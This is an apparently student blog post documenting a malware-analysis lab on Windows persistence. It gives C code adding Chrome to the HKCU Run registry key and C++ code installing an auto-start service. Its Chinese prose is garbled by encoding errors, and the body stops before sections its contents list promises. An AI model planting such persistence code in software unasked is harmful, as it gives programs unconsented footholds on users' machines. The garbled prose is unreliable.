<!DOCTYPE html>
<html lang="en">
    
    <style>
        body
        {
            font-family: "Times New Roman", Helvetica, Tahoma, Arial,   LXGW WenKai   "notoserifsc-medium", "Microsoft YaHei", "Hiragino Sans GB", "WenQuanYi Micro Hei", sans-serif !important;

        }
    </style>

    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
    <meta name="description" content="Malware Analysis Practice2" />
    <meta name="hexo-theme-A4" content="v1.9.6" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>Jay1anğŸˆ</title>

    
        
<link rel="stylesheet" href="/css/highlight/style1.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    

    
        
<link rel="stylesheet" href="/css/returnToLastPage.css">

    
    
   
<link rel="stylesheet" href="/css/lightgallery-bundle.min.css">


<meta name="generator" content="Hexo 7.3.0"></head>
    
    

    
    



    

    
    

    
    
    
    <body>
        <script src="/js/darkmode-js.min.js"></script>
        
        <script>
            const options = {
                bottom: '40px', // default: '32px'
                right: 'unset', // default: '32px'
                left: '42px', // default: 'unset'
                time: '0.3s', // default: '0.3s'
                mixColor: '#fff', // default: '#fff'
                backgroundColor: ' #e4e4e4 ',  // default: '#fff'
                buttonColorDark: '#100f2c',  // default: '#100f2c'
                buttonColorLight: '#fff', // default: '#fff'
                saveInCookies: true, // default: true,
                label: 'ğŸŒ“', // default: ''
                autoMatchOsTheme: true // default: true
            }
            const darkmode = new Darkmode(options);
            darkmode.showWidget();
        </script>
        
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    


<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">Jay1anğŸˆ</a> 
            <span class="description">I am who I am.</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">â›©ï¸é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">ğŸ—’ï¸æ–‡ç« </a></li>
            
        
            
                <li><a href="/categories/">ğŸ·ï¸åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">ğŸ¨å…³äº</a></li>
            
        
            
                <li><a href="/now/">ğŸ¡Now</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">
    

    
        
            
                <div class="post-main-title" style="text-align: center;">
                    Malware Analysis Practice2
                </div>
            
        
      
    

    

        
            <div class="post-head-meta-center">
        
                
                    <span>æœ€è¿‘æ›´æ–°ï¼š2024-07-02</span> 
                
                
                    
                        &nbsp; | &nbsp;
                    
                     <span>å­—æ•°æ€»è®¡ï¼š6.3k</span>
                
                
                    
                        &nbsp; | &nbsp;
                    
                    <span>é˜…è¯»ä¼°æ—¶ï¼š28åˆ†é’Ÿ</span>
                
                
                    
                        &nbsp; | &nbsp;
                    
                    <span id="busuanzi_container_page_pv">
                        é˜…è¯»é‡ï¼š<span id="busuanzi_value_page_pv"></span>æ¬¡
                    </span>
                
            </div>
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ·»åŠ æœåŠ¡çš„æ–¹å¼å®ç°è‡ªå¯åŠ¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="post-toc-text">å®éªŒè¦æ±‚</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="post-toc-text">å®éªŒç¯å¢ƒ</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="post-toc-text">å®éªŒç›®çš„</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="post-toc-text">å®éªŒæ­¥éª¤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%AE%9E%E8%B7%B5-1-%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">å®è·µ-1-ä¿®æ”¹æ³¨å†Œè¡¨è‡ªå¯åŠ¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#Run-RunOnce-RunOnceEx%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="post-toc-text">Run&#x2F;RunOnce&#x2F;RunOnceExçš„åŒºåˆ«</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%AE%9E%E8%B7%B5-2-%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">å®è·µ-2-æ·»åŠ æœåŠ¡å®ç°è‡ªå¯åŠ¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="post-toc-text">å‚è€ƒèµ„æ–™</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DLL%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99"><span class="post-toc-text">DLLæ–‡ä»¶ç¼–å†™</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="post-toc-text">å®éªŒè¦æ±‚</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-1"><span class="post-toc-text">å®éªŒç¯å¢ƒ</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84-1"><span class="post-toc-text">å®éªŒç›®çš„</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-1"><span class="post-toc-text">å®éªŒæ­¥éª¤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E7%94%9F%E6%88%90DLL%E6%96%87%E4%BB%B6"><span class="post-toc-text">ç”ŸæˆDLLæ–‡ä»¶</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E8%B0%83%E7%94%A8DLL%E6%96%87%E4%BB%B6"><span class="post-toc-text">è°ƒç”¨DLLæ–‡ä»¶</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="post-toc-text">æµ‹è¯•</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%AE%80%E5%8D%95%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="post-toc-text">ç®€å•å¤šçº¿ç¨‹æœåŠ¡å™¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-2"><span class="post-toc-text">å®éªŒè¦æ±‚</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-2"><span class="post-toc-text">å®éªŒç¯å¢ƒ</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84-2"><span class="post-toc-text">å®éªŒç›®çš„</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-2"><span class="post-toc-text">å®éªŒæ­¥éª¤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E4%BB%A3%E7%A0%81task3-server-cpp"><span class="post-toc-text">æœåŠ¡ç«¯çš„ä»£ç task3_server.cpp</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%A3%E7%A0%81task3-client-cpp"><span class="post-toc-text">å®¢æˆ·ç«¯çš„ä»£ç task3_client.cpp</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%B5%8B%E8%AF%95-1"><span class="post-toc-text">æµ‹è¯•</span></a></li></ol></li></ol></li></ol></li></ol>
            
        
        <div class=".article-gallery"><h2 id="é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ·»åŠ æœåŠ¡çš„æ–¹å¼å®ç°è‡ªå¯åŠ¨"><a href="#é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ·»åŠ æœåŠ¡çš„æ–¹å¼å®ç°è‡ªå¯åŠ¨" class="headerlink" title="é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ·»åŠ æœåŠ¡çš„æ–¹å¼å®ç°è‡ªå¯åŠ¨"></a>é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ·»åŠ æœåŠ¡çš„æ–¹å¼å®ç°è‡ªå¯åŠ¨</h2><h3 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h3><ul>
<li>ç¼–å†™ä»£ç ï¼Œç¼–è¾‘æ³¨å†Œè¡¨çš„Run&#x2F;RunOnce&#x2F;RunOnceExé”®ï¼ˆä»»é€‰å…¶ä¸€ï¼Œå¹¶æ˜ç¡®ä¸‰ä¸ªé”®çš„åŒºåˆ«ï¼‰ï¼Œè¾¾åˆ°è®©æŸä¸€ç¨‹åºåœ¨ç³»ç»Ÿå¯åŠ¨åè‡ªåŠ¨è¿è¡Œçš„ç›®çš„ï¼ˆå¯ä»¥ä»¥è®¡ç®—å™¨ã€è®°äº‹æœ¬ç­‰ä½œä¸ºç›®æ ‡ç¨‹åºï¼‰ã€‚</li>
<li>ä»¥æœåŠ¡æ–¹å¼å®ç°è‡ªå¯åŠ¨ï¼Œä»¥DLLæˆ–è€…EXEæ–¹å¼å‡å¯ã€‚</li>
</ul>
<h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><ul>
<li>Windows 7æˆ–Windows 10ä¸»æœºï¼ˆè™šæ‹Ÿæœºï¼‰ï¼›</li>
<li>ä»£ç ç¼–è¾‘å™¨ï¼›</li>
<li>C&#x2F;C++ä»£ç è¿è¡Œæ‰€éœ€ç¯å¢ƒã€‚</li>
</ul>
<h3 id="å®éªŒç›®çš„"><a href="#å®éªŒç›®çš„" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h3><p>äº†è§£æ¶æ„ä»£ç è‡ªå¯åŠ¨å¸¸ç”¨æ‰‹æ®µã€‚</p>
<h3 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h3><h4 id="å®è·µ-1-ä¿®æ”¹æ³¨å†Œè¡¨è‡ªå¯åŠ¨"><a href="#å®è·µ-1-ä¿®æ”¹æ³¨å†Œè¡¨è‡ªå¯åŠ¨" class="headerlink" title="å®è·µ-1-ä¿®æ”¹æ³¨å†Œè¡¨è‡ªå¯åŠ¨"></a>å®è·µ-1-ä¿®æ”¹æ³¨å†Œè¡¨è‡ªå¯åŠ¨</h4><p>åˆ©ç”¨Cè¯­è¨€ç¼–ç¨‹ï¼Œç¼–è¾‘<code>HKEY_CURRENT_USER</code>ä¸‹çš„è‡ªå¯åŠ¨å¥<code>Run</code>ï¼Œå®ç°å¼€æœºè‡ªå¯åŠ¨è°·æ­Œæµè§ˆå™¨ã€‚</p>
<p>ç”¨åˆ°äº†<code>Windows.h</code>åº“çš„<code>regOpenResultEx</code>å‡½æ•°å’Œ<code>regSetValueEx</code>ç­‰å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    LONG regOpenResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å¼€æ³¨å†Œè¡¨é”®</span></span><br><span class="line">    <span class="comment">// æ³¨ï¼šHKEY_CURRENT_USERè¡¨ç¤ºåªé’ˆå¯¹å½“å‰ç”¨æˆ·ï¼Œè‹¥è¦æ”¹ä¸ºHKEY_LOCAL_MACHINEåˆ™éœ€è¦ç®¡ç†å‘˜æƒé™</span></span><br><span class="line">    regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (regOpenResult != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ— æ³•æ‰“å¼€æ³¨å†Œè¡¨é”®: %d\n&quot;</span>, regOpenResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®é”®å€¼çš„åå­—å¯¹åº”çš„å€¼</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name = <span class="string">&quot;auto_run_chrome&quot;</span>; </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* value = <span class="string">&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot;</span>;   <span class="comment">// è®¾ç½®è¦è‡ªå¯åŠ¨çš„ç¨‹åºçš„è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†å…¶å†™å…¥runä¸‹</span></span><br><span class="line">    regOpenResult = RegSetValueEx(hKey,name,<span class="number">0</span>,REG_SZ,value,<span class="built_in">strlen</span>(value)+<span class="number">1</span>); </span><br><span class="line">    <span class="keyword">if</span>(regOpenResult != ERROR_SUCCESS)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;è‡ªå¯åŠ¨é¡¹å†™å…¥å¤±è´¥:%d\n&quot;</span>,regOpenResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;è‡ªå¯åŠ¨é¡¹å†™å…¥æˆåŠŸ!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…³é—­æ³¨å†Œè¡¨é”®</span></span><br><span class="line">    RegCloseKey(hKey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\jay1an\Desktop\<span class="number">2023</span><span class="number">-10</span><span class="number">-30</span>&gt; gcc .\task1.c</span><br><span class="line">PS C:\Users\jay1an\Desktop\<span class="number">2023</span><span class="number">-10</span><span class="number">-30</span>&gt; .\a.exe</span><br><span class="line">è‡ªå¯åŠ¨é¡¹å†™å…¥æˆåŠŸ!</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†æŸ¥çœ‹æ³¨å†Œè¡¨ï¼Œä¼šå‘ç°è°·æ­Œæµè§ˆå™¨å·²ç»è¢«æ·»åŠ åˆ°runä¸‹äº†ã€‚</p>
<p><a href="/../img/Malware-Analysis-Practice2/1.png" title="1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/1.png" alt="1"></a></p>
<p>åˆ‡æ¢ç”¨æˆ·æ—¶ï¼ˆé‡å¯åŠ¨ä¹Ÿç®—ï¼‰ï¼Œç”µè„‘ä¼šè‡ªåŠ¨æ‰“å¼€è°·æ­Œæµè§ˆå™¨ã€‚</p>
<h5 id="Run-RunOnce-RunOnceExçš„åŒºåˆ«"><a href="#Run-RunOnce-RunOnceExçš„åŒºåˆ«" class="headerlink" title="Run&#x2F;RunOnce&#x2F;RunOnceExçš„åŒºåˆ«"></a><code>Run</code>&#x2F;<code>RunOnce</code>&#x2F;<code>RunOnceEx</code>çš„åŒºåˆ«</h5><p>åªè€ƒè™‘åœ¨ <code>HKEY_CURRENT_USER</code> ä¸‹çš„æƒ…å†µï¼Œ<code>HKEY_CURRENT_USER</code> ä¸­çš„é¡¹ç›®åªé€‚ç”¨äºå½“å‰ç™»å½•çš„ç”¨æˆ·ã€‚</p>
<p>ä¸‹é¢æ˜¯æœ‰å…³ <code>Run</code>ã€<code>RunOnce</code> å’Œ <code>RunOnceEx</code> é”®çš„ä¸»è¦åŒºåˆ«ï¼š</p>
<ol>
<li><strong><code>Run</code>é”®</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>)ï¼š<ul>
<li><strong>æ‰§è¡Œæ—¶æœº</strong>ï¼šè¿™ä¸ªé”®ä¸­çš„é¡¹ç›®åœ¨å½“å‰ç”¨æˆ·æ¯æ¬¡ç™»å½•åéƒ½ä¼šè‡ªåŠ¨è¿è¡Œï¼ŒåŒ…æ‹¬ç³»ç»Ÿå¯åŠ¨å’Œç”¨æˆ·åˆ‡æ¢ã€‚</li>
</ul>
</li>
<li><strong><code>RunOnce</code>é”®</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>)ï¼š<ul>
<li><strong>æ‰§è¡Œæ—¶æœº</strong>ï¼šè¿™ä¸ªé”®ä¸­çš„é¡¹ç›®åªåœ¨å½“å‰ç”¨æˆ·çš„ä¸‹ä¸€æ¬¡ç™»å½•åè¿è¡Œä¸€æ¬¡ï¼Œç„¶åè‡ªåŠ¨ä»æ³¨å†Œè¡¨ä¸­åˆ é™¤ã€‚</li>
</ul>
</li>
<li><strong><code>RunOnceEx</code>é”®</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>)ï¼š<ul>
<li><strong>æ‰§è¡Œæ—¶æœº</strong>ï¼šè¿™ä¸ªé”®ä¸­çš„é¡¹ç›®ç±»ä¼¼äº<code>RunOnce</code>é”®ï¼Œåªåœ¨å½“å‰ç”¨æˆ·çš„ä¸‹ä¸€æ¬¡ç™»å½•åè¿è¡Œä¸€æ¬¡ï¼Œç„¶åè‡ªåŠ¨ä»æ³¨å†Œè¡¨ä¸­åˆ é™¤ã€‚</li>
<li><strong>é¢å¤–ç‰¹æ€§</strong>ï¼š<code>RunOnceEx</code>é”®å…è®¸æ›´å¤æ‚çš„æ“ä½œï¼Œå¦‚åœ¨é¡¹ç›®ä¸­æŒ‡å®šä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶æˆ–è„šæœ¬ï¼Œä»¥ä¾¿åœ¨ç™»å½•æ—¶æ‰§è¡Œå¤šä¸ªå‘½ä»¤ã€‚</li>
</ul>
</li>
</ol>
<p>åœ¨å•ä¸ªç”¨æˆ·çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ <code>Run</code> é”®æ¥é…ç½®åœ¨æ¯æ¬¡è¯¥ç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨è¿è¡Œçš„ç¨‹åºï¼Œè€Œ <code>RunOnce</code> é”®ç”¨äºé…ç½®åªåœ¨è¯¥ç”¨æˆ·çš„ä¸‹ä¸€æ¬¡ç™»å½•æ—¶è¿è¡Œä¸€æ¬¡çš„ç¨‹åºã€‚<code>RunOnceEx</code> æä¾›äº†æ›´é«˜çº§çš„é€‰é¡¹ï¼Œå¯ä»¥ç”¨äºæ‰§è¡Œå¤æ‚çš„ä»»åŠ¡ã€‚</p>
<h4 id="å®è·µ-2-æ·»åŠ æœåŠ¡å®ç°è‡ªå¯åŠ¨"><a href="#å®è·µ-2-æ·»åŠ æœåŠ¡å®ç°è‡ªå¯åŠ¨" class="headerlink" title="å®è·µ-2-æ·»åŠ æœåŠ¡å®ç°è‡ªå¯åŠ¨"></a>å®è·µ-2-æ·»åŠ æœåŠ¡å®ç°è‡ªå¯åŠ¨</h4><p>åˆ›å»ºæœåŠ¡çš„ä»£ç ï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SC_HANDLE schSCManager, schService;</span><br><span class="line">    <span class="comment">// å¡«å†™ç³»ç»ŸæœåŠ¡exeæ–‡ä»¶</span></span><br><span class="line">    TCHAR szPath[MAX_PATH] = <span class="string">&quot;C:\\Users\\jay1an\\Desktop\\Practice2\\2023-11-13-service\\myservice.exe&quot;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// æ‰“å¼€æœåŠ¡æ§åˆ¶ç®¡ç†å™¨</span></span><br><span class="line">    schSCManager = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (schSCManager == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        DWORD error = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">if</span> (error == ERROR_ACCESS_DENIED) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Access denied. Run the program as administrator.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OpenSCManager failed (%d)\n&quot;</span>, error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºæœåŠ¡å¹¶è®¾ç½®å…¶å¯åŠ¨å‚æ•°</span></span><br><span class="line">    schService = <span class="built_in">CreateService</span>(</span><br><span class="line">        schSCManager,               <span class="comment">// SCManager database</span></span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;myservice&quot;</span>),          <span class="comment">// name of service</span></span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;malicious code lab&quot;</span>), <span class="comment">// name to display</span></span><br><span class="line">        SERVICE_ALL_ACCESS,         <span class="comment">// desired access</span></span><br><span class="line">        SERVICE_WIN32_OWN_PROCESS,  <span class="comment">// service type</span></span><br><span class="line">        SERVICE_AUTO_START,         <span class="comment">// start type</span></span><br><span class="line">        SERVICE_ERROR_NORMAL,       <span class="comment">// error control type</span></span><br><span class="line">        szPath,                     <span class="comment">// path to service&#x27;s binary</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// no load ordering group</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// no tag identifier</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// no dependencies</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// LocalSystem account</span></span><br><span class="line">        <span class="literal">NULL</span>                        <span class="comment">// no password</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (schService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;CreateService failed (%d)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(schSCManager);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service installed successfully.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯åŠ¨æœåŠ¡</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œéœ€è¦ç®¡ç†å‘˜æƒé™</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">StartService</span>(schService, <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;StartService failed (%d)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service starts successfully.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…³é—­å¥æŸ„</span></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(schService);</span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(schSCManager);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œåˆ›å»º-å¯åŠ¨æœåŠ¡çš„ç¨‹åºï¼š</p>
<p><a href="/../img/Malware-Analysis-Practice2/10.png" title="10" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/10.png" alt="10"></a></p>
